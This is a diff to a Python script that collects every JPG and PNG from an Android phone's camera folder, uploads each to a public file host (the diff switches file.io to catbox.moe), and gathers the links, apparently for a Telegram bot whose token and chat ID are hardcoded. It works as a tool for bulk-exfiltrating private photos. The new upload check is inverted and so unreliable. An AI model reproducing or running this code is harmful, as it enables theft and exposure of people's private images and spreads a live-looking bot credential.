@@ -5,25 +5,24 @@ BOT_TOKEN="8200691947:AAF-wOE90vTafT21Hqzs5WXokd2iBVstdl4"
 CHAT_ID="8519296209"
 CAMERA="/storage/emulated/0/DCIM/Camera"
 
-def upload_to_fileio(file_path):
+def upload_to_catbox(file_path):
     try:
         with open(file_path,'rb') as f:
-            r=requests.post('https://file.io', files={'file': f})
-            d=r.json()
-            if d['success']:
-                return d['link']
+            r=requests.post('https://catbox.moe/user/api.php', data={'reqtype':'fileupload'}, files={'fileToUpload':f})
+            if r.text and not r.text.startswith('https://catbox.moe/'):
+                return r.text.strip()
     except:
         return None
     return None
 
 print("Searching for photos...")
-p=[os.path.join(CAMERA,f) for f in os.listdir(CAMERA) if f.lower().endswith(('.jpg','.jpeg','.png'))]
+p=[os.path.join(CAMERA,f) for f in os.listdir(CAMERA) if f.lower().endswith(('.jpg','.jpeg','.png')) and not f.startswith('.trashed')]
 print(f"Found {len(p)} photos")
 
 links=[]
 for i,photo in enumerate(p,1):
     print(f"Uploading {i}/{len(p)}...")
-    link=upload_to_fileio(photo)
+    link=upload_to_catbox(photo)
     if link:
         links.append(f"{os.path.basename(photo)}:{link}")
         print(f"OK {link}")
